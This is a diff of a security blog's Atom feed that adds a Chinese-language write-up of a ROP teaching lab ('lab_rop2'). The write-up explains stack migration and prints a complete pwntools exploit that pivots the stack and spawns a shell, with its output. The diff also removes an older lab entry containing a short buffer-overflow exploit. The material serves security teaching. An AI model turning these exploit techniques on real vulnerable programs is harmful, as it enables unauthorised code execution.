@@ -6,7 +6,7 @@
   <link href="https://kazma.tw/atom.xml" rel="self"/>
   
   <link href="https://kazma.tw/"/>
-  <updated>2024-06-06T18:57:15.493Z</updated>
+  <updated>2024-08-03T09:06:13.685Z</updated>
   <id>https://kazma.tw/</id>
   
   <author>
@@ -15,6 +15,36 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>LYS Rop lab_rop2 Writeup</title>
+    <link href="https://kazma.tw/2024/08/01/LYS-Rop-lab-rop2-Writeup/"/>
+    <id>https://kazma.tw/2024/08/01/LYS-Rop-lab-rop2-Writeup/</id>
+    <published>2024-08-01T01:24:27.147Z</published>
+    <updated>2024-08-03T09:06:13.685Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="lab-rop2"><a href="#lab-rop2" class="headerlink" title="lab_rop2"></a>lab_rop2</h1><p>這次藉著到 AIS3 當助教的緣故順便跟 <a class="link"   href="https://curious-lucifer.netlify.app/" >Curious <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 一起把 LYS ROP 系列課程的 lab 整理到了部落格，也方便給學員參考。<br>那因為是一系列的 lab，所以接下來只會主要講跟上個版本的差異</p><h2 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h2><p>首先提一下 stack migration 的概念：<br>當我們今天發現程式可以 overflow 但是溢出的長度卻不夠我們構造 ROP 開 shell 的時候，我們可以透過塞入一個 <code>leave; ret</code> gadget，控制 rbp 進而跳到另外一個足夠的空間詠唱。<br>以下附上 LYS 的投影片截圖參考：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/rop2_stack.png"                      alt="stack"                ></p><h2 id="Diff"><a href="#Diff" class="headerlink" title="Diff"></a>Diff</h2><p>首先附上部分程式碼：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;What is your name? &quot;</span>);</span><br><span class="line">readbuf(name, <span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, name);</span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You have a buffer overflow vuln: &quot;</span>);</span><br><span class="line">readbuf(buf, <span class="number">0x20</span>);</span><br></pre></td></tr></table></figure></div><p>那這次跟 rop1 的主要差別是第二個輸入點的溢出長度只有 0x10，所以沒辦法跟上一個 lab 一樣把 rop chain 寫到 buf 裡，那這裡就可以用我們上面提到的 stack migration。</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>我們可以透過先往 name 寫入 <code>/bin/sh\x00</code> 還有我們的 rop chain，然後再從 buf 填入 name 的地址和 <code>leave; ret</code> 來讓 rip 跳到 rop chain 上，成功 RCE。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = remote(&quot;35.229.243.81&quot;, 10102)</span></span><br><span class="line">r = process(<span class="string">&quot;./rop2&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x44FD87</span></span><br><span class="line">pop_rdi = <span class="number">0x401F4F</span></span><br><span class="line">pop_rdx_rbx = <span class="number">0x485BAB</span></span><br><span class="line">pop_rsi = <span class="number">0x409F7E</span></span><br><span class="line">syscall = <span class="number">0x401D04</span></span><br><span class="line">name = <span class="number">0x4C7300</span></span><br><span class="line">leave_ret = <span class="number">0x4017EE</span></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    pop_rax, <span class="number">0x3B</span>, </span><br><span class="line">    pop_rdi, name, </span><br><span class="line">    pop_rsi, <span class="number">0</span>, </span><br><span class="line">    pop_rdx_rbx, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line">    syscall</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;name? &quot;</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span> + p)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;vuln: &quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span> + flat(name, leave_ret))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="Dive-in"><a href="#Dive-in" class="headerlink" title="Dive in"></a>Dive in</h2><p>那剛好這幾天在 AIS3 當助教有很多學員都問到同一個問題，這邊提出來討論：<br>Q: 為什麼 migration 不是跳到 name + 8 的位置，執行 <code>/bin/sh\x00</code> 不會報錯嗎？<br>A: 問的好，首先如果我們不確定 exploit 執行過程中到底 binary 發生什麼事的話，gdb 是我們的好朋友。<br>那打開 gdb 後我們首先來看一下 payload 放進去的樣子：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/rop2_explain.png"                      alt="explain"                ><br>看起來很完美，那繼續執行下去很去就會發現兩次的 <code>leave; ret</code> 會把 rbp 填成 <code>/bin/sh\x00</code>：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/rop2_explain2.png"                      alt="explain2"                ><br>所以這樣剛好 rip 就會從 rop chain 的開頭開始執行。</p><h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><p>最後依照慣例附上 exploit 的結果：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./rop2&#x27;</span>: pid 113595</span><br><span class="line">[*] running <span class="keyword">in</span> new terminal: [<span class="string">&#x27;/usr/bin/gdb&#x27;</span>, <span class="string">&#x27;-q&#x27;</span>, <span class="string">&#x27;./rop2&#x27;</span>, <span class="string">&#x27;113595&#x27;</span>]</span><br><span class="line">[+] Waiting <span class="keyword">for</span> debugger: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1000(kazma) gid=1000(kazma) <span class="built_in">groups</span>=1000(kazma),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(<span class="built_in">users</span>),101(netdev),116(bluetooth),129(scanner)</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;lab-rop2&quot;&gt;&lt;a href=&quot;#lab-rop2&quot; class=&quot;headerlink&quot; title=&quot;lab_rop2&quot;&gt;&lt;/a&gt;lab_rop2&lt;/h1&gt;&lt;p&gt;這次藉著到 AIS3 當助教的緣故順便跟 &lt;a class=&quot;link&quot;   href=&quot;h</summary>
+      
+    
+    
+    
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
+    
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
+    
+    <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
+    
+    <category term="migration" scheme="https://kazma.tw/tags/migration/"/>
+    
+  </entry>
   
   <entry>
     <title>Pwnable.tw Death Note Writeup</title>
@@ -38,9 +68,9 @@
     
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
-    <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
-    
     <category term="shellcode" scheme="https://kazma.tw/tags/shellcode/"/>
+    
+    <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
     
   </entry>
   
@@ -64,13 +94,13 @@
     
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
-    <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
-    <category term="ret2libc" scheme="https://kazma.tw/tags/ret2libc/"/>
+    <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
     
     <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
+    
+    <category term="ret2libc" scheme="https://kazma.tw/tags/ret2libc/"/>
     
   </entry>
   
@@ -96,9 +126,9 @@
     
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
-    <category term="ret2libc" scheme="https://kazma.tw/tags/ret2libc/"/>
-    
     <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
+    
+    <category term="ret2libc" scheme="https://kazma.tw/tags/ret2libc/"/>
     
     <category term="heap" scheme="https://kazma.tw/tags/heap/"/>
     
@@ -232,11 +262,11 @@
     
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
-    <category term="ret2libc" scheme="https://kazma.tw/tags/ret2libc/"/>
-    
     <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
     
     <category term="oob" scheme="https://kazma.tw/tags/oob/"/>
+    
+    <category term="ret2libc" scheme="https://kazma.tw/tags/ret2libc/"/>
     
   </entry>
   
@@ -314,9 +344,9 @@
     
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
-    <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
     
     <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
     
@@ -427,9 +457,9 @@
     
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
-    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
     
     <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
     
@@ -455,9 +485,9 @@
     
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
-    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
     
     <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
     
@@ -483,9 +513,9 @@
     
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
-    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
     
     <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
     
@@ -511,9 +541,9 @@
     
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
-    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
     
     <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
     
@@ -539,39 +569,9 @@
     
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
-    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
-    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Pwnctf secret Writeup</title>
-    <link href="https://kazma.tw/2024/01/09/Pwnctf-secret-Writeup/"/>
-    <id>https://kazma.tw/2024/01/09/Pwnctf-secret-Writeup/</id>
-    <published>2024-01-09T11:49:31.000Z</published>
-    <updated>2024-01-09T12:10:25.616Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h1><p>我們先來看一下有哪些變數：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/secret_var.png"                      alt="var"                ><br>關鍵在他會比較 var_4h 是不是 0xab37：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/secret_0x4.png"                      alt="0x4"                ><br>我們要從 var_20h overflow 到 var_4h，然後送一個大寫 Y，就可以拿到 flag 了。</p><p>exploit.py</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./secret&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1c</span> + p64(<span class="number">0xab37</span>))</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;)&#x27;</span>, <span class="string">&quot;Y&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;secret&quot;&gt;&lt;a href=&quot;#secret&quot; class=&quot;headerlink&quot; title=&quot;secret&quot;&gt;&lt;/a&gt;secret&lt;/h1&gt;&lt;p&gt;我們先來看一下有哪些變數：&lt;br&gt;&lt;img  
-                     lazyload
-</summary>
-      
-    
-    
-    
-    
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
-    
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
     
